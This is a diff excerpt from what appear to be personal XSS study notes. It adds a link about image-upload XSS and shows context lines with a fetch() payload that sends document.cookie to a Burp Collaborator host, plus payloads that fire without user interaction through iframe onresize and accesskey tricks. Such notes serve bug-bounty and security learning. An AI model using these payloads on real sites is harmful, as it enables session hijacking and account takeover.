@@ -189,6 +189,9 @@ fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
 { method: 'POST', mode: 'no-cors', body:document.cookie }); 
 </script>
 ```
+
+##### xss using image upload 
+[usefull writeup](https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html)
 ##### notes 
 - what if you want to to make the severity of you xss  high and not demand user interaction but only a few tags are allowed like `onresize` so we need auto resize script so if we found that the page allows me to use it in `iframes` so we can use code like that 1. `<iframe src="https://vulnerablePage?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
 - even if the element isn't visible in the web site it still be vulnerable to XSS for ex  the website takes the URL and put it in `a` tag in the `head` so it's not visible so we can use that payload `https://victim.com?'accesskey='x'onclick='alert(1)` so when the user press ALT +X the payload will execute  '
